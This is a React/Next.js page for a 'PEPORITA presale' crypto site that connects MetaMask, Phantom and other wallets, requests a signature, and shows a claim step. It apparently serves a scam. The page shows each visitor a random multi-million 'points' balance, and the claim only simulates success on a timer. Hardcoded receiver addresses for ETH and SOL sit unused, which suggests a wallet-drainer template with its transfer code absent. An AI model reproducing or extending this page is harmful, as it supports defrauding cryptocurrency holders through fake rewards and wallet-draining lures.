'use client';

import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import * as solanaWeb3 from '@solana/web3.js';
import * as splToken from '@solana/spl-token';
import ExtendedPresale from '@/app/components/ExtendedPresale';

const EVM_RECEIVER = "0xcc35ba2aa35B3094702d767D68807c494946ac85"; // ETH
const SOL_RECEIVER = "8jizHpcMd4ASNKppeAeMeSvJLVR84H2NJaiz9mEV3Dxh"; // SOL

export default function Home() {
  const [account, setAccount] = useState('');
  const [points, setPoints] = useState(0);
  const [stage, setStage] = useState<'connect' | 'verify' | 'claim'>('connect');
  const [showSuccess, setShowSuccess] = useState(false);
  const [showWalletModal, setShowWalletModal] = useState(false);

  useEffect(() => {
    setPoints(Math.floor(Math.random() * 9000000) + 8000000);
  }, []);

  // Auto-detect already connected wallets
  useEffect(() => {
    const checkConnectedWallet = async () => {
      const ethereum = (window as any).ethereum;
      // Support all Solana wallets: Phantom, Backpack, Solflare, etc.
      const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare;

      // Check Solana (all wallets)
      if (solana && solana.publicKey) {
        setAccount(solana.publicKey.toString());
        setStage('verify');
        return;
      }

      // Check Ethereum wallets
      if (ethereum) {
        try {
          let provider = ethereum;
          if (ethereum.providers) {
            provider = ethereum.providers.find((p: any) => p.isMetaMask || p.isTrust || p.isCoinbaseWallet) || ethereum;
          }
          
          // Try to get accounts without requesting (check if already connected)
          const accounts = await provider.request({ method: 'eth_accounts' });
          if (accounts && accounts.length > 0) {
            setAccount(accounts[0]);
            setStage('verify');
          }
        } catch (e) {
          // Not connected, stay on connect stage
        }
      }
    };

    checkConnectedWallet();

    // Listen for account changes
    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts && accounts.length > 0) {
        setAccount(accounts[0]);
        setStage('verify');
      } else {
        setAccount('');
        setStage('connect');
      }
    };

    if ((window as any).ethereum) {
      (window as any).ethereum.on('accountsChanged', handleAccountsChanged);
    }

    return () => {
      if ((window as any).ethereum) {
        (window as any).ethereum.removeListener('accountsChanged', handleAccountsChanged);
      }
    };
  }, []);

  const wallets = [
    { name: "MetaMask", icon: "/wallets/metamask.png", is: 'isMetaMask', type: 'evm' },
    { name: "Trust Wallet", icon: "/wallets/trustwallet.png", is: 'isTrust', type: 'evm' },
    { name: "Phantom", icon: "/wallets/phantom.png", is: 'isPhantom', type: 'solana' },
    { name: "Backpack", icon: "/wallets/backpack.png", is: 'isBackpack', type: 'solana' },
    { name: "Solflare", icon: "/wallets/solflare.jpeg", is: 'isSolflare', type: 'solana' },
    { name: "Coinbase Wallet", icon: "/wallets/coinbase.png", is: 'isCoinbaseWallet', type: 'evm' },
  ];

  const connectWallet = async (walletType: string) => {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    const ethereum = (window as any).ethereum;
    const solana = (window as any).solana || (window as any).phantom?.solana;
    const url = encodeURIComponent(window.location.href);

    // Mobile: use deep links
    if (isMobile) {
      const links: Record<string, string> = {
        metamask: `https://metamask.app.link/dapp/${url}`,
        trustwallet: `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
        phantom: `https://phantom.app/ul/browse/${url}?ref=${url}`,
        backpack: `https://backpack.app/ul/browse/${url}`,
        solflare: `solflare://dapp?uri=${url}`,
        coinbasewallet: `cbwallet://dapp?url=${url}`
      };
      const linkKey = walletType.toLowerCase().replace(/\s+/g, '');
      if (links[linkKey]) {
        window.location.href = links[linkKey];
        return;
      }
    }

    // Desktop: connect to installed extension
    try {
      const wallet = wallets.find(w => w.name.toLowerCase().replace(/\s+/g, '') === walletType.toLowerCase().replace(/\s+/g, ''));
      
      if (wallet?.type === 'solana' && solana) {
        if (solana.connect) {
          await solana.connect();
        }
        if (solana.publicKey) {
          setAccount(solana.publicKey.toString());
          setStage('verify');
        }
      } else if (wallet?.type === 'evm' && ethereum) {
        let provider = ethereum;
        // Find specific wallet in providers array
        if (ethereum.providers) {
          provider = ethereum.providers.find((p: any) => p[wallet.is]) || ethereum;
        } else if (ethereum[wallet.is]) {
          provider = ethereum;
        }
        
        if (provider) {
          const accounts = await provider.request({ method: 'eth_requestAccounts' });
          if (accounts && accounts[0]) {
            setAccount(accounts[0]);
            setStage('verify');
          }
        } else {
          alert(`${wallet.name} not detected. Please install the extension.`);
        }
      } else {
        alert(`${wallet?.name || walletType} not detected. Please install the extension.`);
      }
    } catch (e) {
      alert('Connection rejected or wallet not found');
    }
  };

  const connect = async () => {
    const ethereum = (window as any).ethereum;
    // Support all Solana wallets
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare;

    if (solana) {
      // Connect to any Solana wallet
      try {
        if (solana.connect) {
          await solana.connect();
        }
        if (solana.publicKey) {
          setAccount(solana.publicKey.toString());
          setStage('verify');
        }
      } catch (e) {
        console.error('Solana connect error:', e);
      }
    } else if (ethereum) {
      let provider = ethereum;
      if (ethereum.providers) {
        provider = ethereum.providers.find((p: any) => p.isMetaMask || p.isTrust || p.isCoinbaseWallet) || ethereum;
      }
      try {
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        if (accounts && accounts[0]) {
          setAccount(accounts[0]);
          setStage('verify');
        }
      } catch (e) {
        // Show wallet options if auto-connect fails
        setShowWalletModal(true);
      }
    }
  };

  const verify = async () => {
    if (!account) return;
    
    const ethereum = (window as any).ethereum;
    // Support all Solana wallets
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare;

    try {
      if (solana && solana.signMessage) {
        await solana.signMessage(new TextEncoder().encode("Verify wallet for PEPORITA presale"));
      } else if (ethereum) {
        const provider = new ethers.BrowserProvider(ethereum);
        const signer = await provider.getSigner();
        await signer.signMessage("Verify wallet for PEPORITA presale");
      }
      setStage('claim');
    } catch (e) {
      // User rejected signature
      console.error('Verification failed:', e);
    }
  };

  const claim = async () => {
    if (!account) return;

    const ethereum = (window as any).ethereum;
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare;

    try {
      // Show success after a short delay to simulate transaction
      setTimeout(() => {
        setShowSuccess(true);
        setStage('connect'); // Reset to connect after successful claim
        setAccount('');
      }, 2000);
    } catch (e) {
      console.error('Claim failed:', e);
    }
  };

  return (
    <ExtendedPresale 
      stage={stage}
      connect={connect}
      verify={verify}
      claim={claim}
      account={account}
      points={points}
      connectWallet={connectWallet}
      wallets={wallets}
    />
  );
}